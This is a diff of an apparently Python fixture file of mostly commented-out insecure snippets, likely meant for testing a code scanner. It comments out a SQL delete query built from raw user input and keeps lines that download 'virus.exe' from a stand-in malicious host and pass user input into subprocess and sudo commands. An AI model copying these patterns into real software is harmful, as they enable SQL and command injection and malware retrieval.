@@ -1,3 +1,22 @@
+# net.latents_var = T.TensorType('float32', [False] * len(net.example_latents.shape))('latents_var')
+
+# parser = argparse.ArgumentParser(prog='myprogram')
+# parser.add_argument('--foo', help='foo of the %(prog)s program')
+# parser.print_help()
+
+# app = Flask(__name__)
+
+# DEBUG = True
+# app.debug = True
+# app.run(debug = True)
+
+app.config['PROPAGATE_EXCEPTIONS'] = True
+
+# debug = True
+
+# name_ver = 'name_ver'
+# info_dir = '%s.dist-info' % name_ver
+
 # url = 'https://www.malicious.com/virus.exe'
 # requests.get(url)
 
@@ -59,11 +78,11 @@
 # DEBUG_PROPAGATE_EXCEPTIONS = True
 # app.run(debug = True, start = True)
 
-# urllib.urlretrieve("192.168.10.1/example.iso")
+# m = urllib.urlretrieve("192.168.10.1/example.iso")
 
-user_input = 'abcdef'
-user_input = input()
-query = "delete from foo where id = " + user_input + user_input
+# user_input = 'abcdef'
+# user_input = input()
+# query = "delete from foo where id = " + user_input + user_input
 # x = "abc"
 
 # process = input()
@@ -76,7 +95,7 @@ query = "delete from foo where id = " + user_input + user_input
 # subprocess.Popen('In the basket are %s and %s' % (comm,pre))
 
 
-execution.query(user_input)
+# execution.query(user_input)
 # result = connection.execute(user_input)
 # sys.argv(f'sudo mkdir {user_input}')
 
